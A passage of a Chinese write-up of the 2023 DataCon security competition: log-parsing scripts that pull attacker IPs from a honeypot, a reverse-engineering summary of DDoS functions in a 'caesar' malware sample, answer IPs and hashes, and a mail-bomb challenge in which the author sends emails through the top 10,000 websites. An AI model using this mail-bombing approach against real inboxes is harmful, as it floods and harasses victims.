class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br>caesar_set = <span class="hljs-built_in">set</span>()<br>caesar_set.add(<span class="hljs-string">&#x27;74.209.210.114&#x27;</span>)<br>caesar_set.add(<span class="hljs-string">&#x27;149.129.92.9&#x27;</span>)<br><br>koba_set=<span class="hljs-built_in">set</span>()<br>koba_set.add(<span class="hljs-string">&#x27;112.192.5.28&#x27;</span>)<br><br><span class="hljs-comment"># 读取文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;honeylog.json&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-comment"># 逐行读取</span><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;caesar&#x27;</span> <span class="hljs-keyword">in</span> line:<br>            <span class="hljs-keyword">try</span>:<br>                data = json.loads(line)<br>                src_ip = data.get(<span class="hljs-string">&#x27;src_ip&#x27;</span>)<br>                <span class="hljs-keyword">if</span> src_ip:<br>                    caesar_set.add(src_ip)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;koba&#x27;</span> <span class="hljs-keyword">in</span> line:<br>            <span class="hljs-keyword">try</span>:<br>                data = json.loads(line)<br>                src_ip = data.get(<span class="hljs-string">&#x27;src_ip&#x27;</span>)<br>                <span class="hljs-keyword">if</span> src_ip:<br>                    koba_set.add(src_ip)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br>        <br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;md5_file.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">&#x27;82f485f6d3dbad747ef307158fc7ea48:&#x27;</span>)<br>    f.write(<span class="hljs-string">&#x27;,&#x27;</span>.join(caesar_set))<br>    f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    f.write(<span class="hljs-string">&#x27;e4d87fc7fd025213a86b0db38b147375:&#x27;</span>)<br>    f.write(<span class="hljs-string">&#x27;,&#x27;</span>.join(koba_set))<br></code></pre></td></tr></table></figure>
+
+<p>得到答案：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">82</span>f485f6d3dbad747ef307158fc7ea<span class="hljs-number">48:149.129.92</span>.<span class="hljs-number">9,74.209.210</span>.<span class="hljs-number">114,194.216.26</span>.<span class="hljs-number">179</span><br>e4d87fc7fd025213a86b0db<span class="hljs-number">38b147375:112</span>.<span class="hljs-number">192.5.28,195</span>.<span class="hljs-number">220.160.50</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="题目四：消失的窃密流量"><a href="#题目四：消失的窃密流量" class="headerlink" title="题目四：消失的窃密流量"></a>题目四：消失的窃密流量</h3><h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p><strong>题目描述</strong>：找到窃密流量最终流向的服务器IP，并根据目前掌握的线索给出**此次攻击事件中(DDoS+窃密)**明确被控的主机IP；请给出原始被窃取文件的MD5。</p>
+<p>我们队伍只找到了部分DDoS的被控ip。</p>
+<h4 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h4><p>使用ida反编译caesar文件，进入main函数</p>
+<img src="/2023/11/16/2023datacon/main.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>进入函数sub_33F9中，发现其调用了多次sub_3A91函数</p>
+<img src="/2023/11/16/2023datacon/33F9.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>进入sub_3A91函数发现是将函数地址写入一个ptr变量。</p>
+<img src="/2023/11/16/2023datacon/3A91.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>查找ptr的调用者，观察到sub_387A函数</p>
+<img src="/2023/11/16/2023datacon/ptr.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>经过分析，该函数是将每个存入的函数地址都进行调用</p>
+<img src="/2023/11/16/2023datacon/387A.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>回到sub_33F9函数中，发现可疑函数sub_5841和sub_6249，进入后发现其均为ddos中发起cc攻击的函数</p>
+<p>sub_5841：</p>
+<img src="/2023/11/16/2023datacon/cc1code.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>sub_6249：</p>
+<img src="/2023/11/16/2023datacon/cc2code.png" srcset="/img/loading.gif" lazyload class="">
+
+<p>因此，将第一题中的cc攻击ip导入进来即可，编写脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">url_set=<span class="hljs-built_in">set</span>()<br><br>q1=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;q1_answer.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>q1.readline()<br>q1.readline()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> q1.readline().strip().split(<span class="hljs-string">&#x27;,&#x27;</span>):<br>    url_set.add(i)<br>q1.readline()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> q1.readline().strip().split(<span class="hljs-string">&#x27;,&#x27;</span>):<br>    url_set.add(i) <br>q1.close()<br><br>q3=<span class="hljs-string">&#x27;153.97.92.169&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;q4_answer.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(q3)<br>    f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    f.write(<span class="hljs-string">&#x27;,&#x27;</span>.join(url_set))<br>    f.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br></code></pre></td></tr></table></figure>
+
+<p>得到25%的分数。</p>
+<h2 id="邮件安全"><a href="#邮件安全" class="headerlink" title="邮件安全"></a>邮件安全</h2><h3 id="题目二：新型邮件炸弹攻击"><a href="#题目二：新型邮件炸弹攻击" class="headerlink" title="题目二：新型邮件炸弹攻击"></a>题目二：新型邮件炸弹攻击</h3><p>编写脚本，提取前10000权重的网址。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python">mails=[]<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;top_mail.csv&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> file:<br>        a=i.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(a[<span class="hljs-number">0</span>])&gt;<span class="hljs-number">10000</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            mails.append(a[<span class="hljs-number">1</span>])<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;top_10000_mails.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(<span class="hljs-string">&#x27;&#x27;</span>.join(mails))<br></code></pre></td></tr></table></figure>
+
+<p>从上到下，依次测试发送邮件。</p>
+<p>使用已注册邮箱，如qq.com、gmail.com等发送邮件。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>最开始以为比赛会很难，但是感觉难度还可以？</p>
+<p>可惜的是互联网威胁溯源到后面逆向的时候就开始乏力了，做不出来题，感觉该逆的都逆了，该脱壳也手脱了，检查点也一次没少，但就是找不到答案的IP地址，等赛后看看别人的wp吧。</p>
+<p>邮件安全那道题单纯的打着玩，发了两个小时的邮件。</p>
+<p>贴一部分的比赛题目：</p>
+<a href="/2023/11/16/2023datacon/%E4%BA%92%E8%81%94%E7%BD%91%E5%A8%81%E8%83%81%E6%BA%AF%E6%BA%90.zip" title="互联网威胁溯源.zip">互联网威胁溯源.zip</a>
+
+<br>
+
+<a href="/2023/11/16/2023datacon/top_mail.csv" title="top_mail.csv">top_mail.csv</a>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/WriteUp/" class="category-chain-item">WriteUp</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/wireshark/" class="print-no-link">#wireshark</a>
+      
+        <a href="/tags/reverse/" class="print-no-link">#reverse</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2023 DataCon大数据安全分析竞赛 WriteUp</div>
+      <div>https://blog.lazyforever.top/2023/11/16/2023datacon/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>lazy_forever</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年11月16日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/11/05/2023newstarctfWeek4/" title="NewStarCTF 2023-WEEK4 Web WriteUp">
+                        <span class="hidden-mobile">NewStarCTF 2023-WEEK4 Web WriteUp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="twikoo"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/twikoo/1.6.8/twikoo.all.min.js', function() {
+        var options = Object.assign(
+          {"envId":"https://twikoo.lazyforever.top/","region":null,"path":null},
+          {
+            el: '#twikoo',
+            path: '',
+            onCommentLoaded: function() {
+              Fluid.utils.listenDOMLoaded(function() {
+                var imgSelector = '#twikoo .tk-content img:not(.tk-owo-emotion)';
+                Fluid.plugins.imageCaption(imgSelector);
+                Fluid.plugins.fancyBox(imgSelector);
+              });
+            }
+          }
+        )
+        twikoo.init(options)
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         次
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
+</html>
